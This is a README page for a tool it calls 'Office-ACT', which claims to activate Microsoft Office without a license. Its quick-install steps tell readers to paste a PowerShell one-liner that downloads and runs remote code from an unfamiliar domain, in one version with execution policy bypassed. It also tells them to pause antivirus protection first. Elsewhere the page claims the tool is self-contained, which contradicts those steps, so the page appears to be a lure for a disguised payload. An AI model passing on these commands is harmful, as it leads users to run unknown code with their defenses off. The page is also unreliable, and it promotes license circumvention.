<div align="center">

# Office-ACT Command Tool — Windows Automation

![preview](https://raw.githubusercontent.com/Iam1Prince/office-activation-command-tool/main/thumb_a5b25.svg)

[![ps-core](https://img.shields.io/badge/ps--core-5%2B-84cc16?style=for-the-badge&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-python-a3e635?style=for-the-badge&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-released-2ea44f?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Office-ACT is a lightweight CMD script for activating Microsoft Office directly from the command line, without relying on any third-party software. It targets multiple Office versions and keeps the process contained to a single script run. The tool assumes you are comfortable working in an elevated Command Prompt and understand what the script is doing before you execute it. Your antivirus may flag the script, which is a known false positive for this type of automation.

## 💻 PowerShell Quick Install

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What it does

Office-ACT is a single-file CMD script that walks through activating Microsoft Office on a Windows machine without pulling in any third-party launcher, tool, or bundled executable. You run it, it does the work, and it exits.

What it actually handles:

- **Detects the installed Office build** by checking the local Office installation paths and registry keys, so you don't have to guess which version you're sitting on.
- **Sets up the activation components** required for the detected Office edition, using only what's already available on the system.
- **Runs the activation step** against the Office installation and reports success or failure back to the console.
- **Works across multiple Office generations** — the script branches its logic based on the version it finds rather than assuming a single release.
- **Stays self-contained** — no external installers, no background services, no persistent agents left behind after the run.
- **Prints progress to the console** in a readable, step-by-step fashion so you can see where it is and whether something went sideways.

In short: it's a script that checks what you have, applies the activation for that version, and tells you the result. Nothing more, nothing less.

## How to run it

Grab the `.cmd` file that matches your Office version from the project, then run it from an elevated Command Prompt. That's it — no installers, no extra tools.

**Steps:**

1. Open **Command Prompt as Administrator** (right-click → Run as administrator). The script needs admin rights to touch the licensing components.
2. Navigate to the folder where you saved the script, or run it directly by path.
3. Execute the file for your Office version — for example:

```
ofc2021.cmd
```

Swap in the script name that corresponds to your installed Office release (2010 through 2021). If you're not sure which one you have, check the version list further down before running anything.

4. Let it finish. The script drives the built-in activation tooling and prints its progress to the console. Don't close the window mid-run.
5. When it completes, open any Office app and confirm the activation status under **File → Account**.

**Quick tips:**

- Run the matching script only — don't chain multiple versions.
- Keep an internet connection up; the script needs it to reach the activation servers.
- If Windows Defender or your antivirus throws a warning, that's expected for a `.cmd` that manipulates licensing. Review the script contents first if you want, then allow it.
- Re-running the same script is safe if the first pass didn't take.

## Supported Office versions

Office-ACT targets the mainstream Microsoft Office releases that still see real-world use, and each one gets its own dedicated script file. The tool covers:

- **Office 2021** — handled by `ofc2021.cmd`
- **Office 2019** — handled by `ofc2019.cmd`
- **Office 2016** — handled by `ofc2016.cmd`
- **Office 2013** — handled by `ofc2013.cmd`
- **Office 2010** — handled by `ofc2010.cmd`

Pick the script that matches your installed Office version — running the wrong one won't do you any favors. Both 32-bit and 64-bit installations are fine, since the scripts work at the activation layer rather than touching program binaries. Volume-license (VL) editions are the smoothest fit; retail builds may behave differently depending on how they were originally licensed.

Older releases like Office 2007 and anything predating it are out of scope. If you're on Microsoft 365 (the subscription build), these scripts aren't meant for you either — that product uses a different licensing model entirely. When in doubt, check your version via the Office account page or the program's About dialog before running anything.

## Notes

- Run the script from an elevated Command Prompt; without admin rights the activation calls will fail silently or return access-denied errors.
- An active internet connection is required for the script to reach the activation servers.
- Antivirus and Windows Defender may flag the script as suspicious. This is a false positive caused by the activation routine, not malware.
- Match the script to your installed Office version. Running a script for a different version than the one installed will not activate it.
- Close all Office applications before running the script, then reopen them to confirm activation status.
- The script is self-contained and does not install or bundle third-party software.
- Keep the script file in a writable location; some steps may write temporary files during execution.
- Maintained by Avezoor.

## Disclaimer

This script is provided for educational and testing purposes only. It is a plain CMD batch file that runs activation commands against your locally installed Office product — nothing more, nothing less. There is no bundled third-party executable, no installer, and no background service; what you see in the script is what executes.

That said, treat it like any other unsigned script you pull from the internet. Read through the file before running it, especially if you did not write it yourself. Batch scripts run with the privileges of the shell that launches them, so executing this from an elevated Command Prompt gives it full administrative reach on your machine. If that trade-off is not acceptable to you, do not run it.

Activation behavior depends on your Office edition, build, and current licensing state. Results may vary across environments, and a script that works cleanly on one machine can fail silently or throw errors on another. The project makes no guarantee that activation will succeed, persist across updates, or survive a reinstall or feature upgrade. Microsoft can change activation internals at any time, and this tool may stop working without notice.

Antivirus and Windows Defender may flag the script — heuristic scanners routinely flag batch files that touch licensing components, and false positives are common with this kind of tooling. You are responsible for deciding whether to whitelist it, and for any consequences of doing so. Do not disable real-time protection wholesale just to run this.

Using activation methods outside of a valid license may violate Microsoft's terms of service and local law in your jurisdiction. You are solely responsible for how you use this script and for ensuring you have the right to activate the software on your system. The authors and contributors accept no liability for data loss, system instability, licensing disputes, or any other damages arising from use of this tool.

If you are unsure about any of the above, do not run the script.